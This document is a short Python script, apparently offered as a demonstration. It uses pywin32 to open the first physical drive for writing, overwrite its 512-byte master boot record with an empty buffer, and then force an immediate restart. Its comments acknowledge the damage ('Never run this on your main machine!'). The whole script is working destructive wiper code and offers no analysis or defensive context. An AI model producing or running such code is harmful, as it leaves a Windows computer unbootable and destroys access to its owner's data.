from win32file import * # pip install pywin32
from win32gui import *
import subprocess

def restart_computer():
    subprocess.call(["shutdown", "-r", "-t", "0"])

hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)
CloseHandle(hDevice) # Close the handle to our Physical Drive!
restart_computer()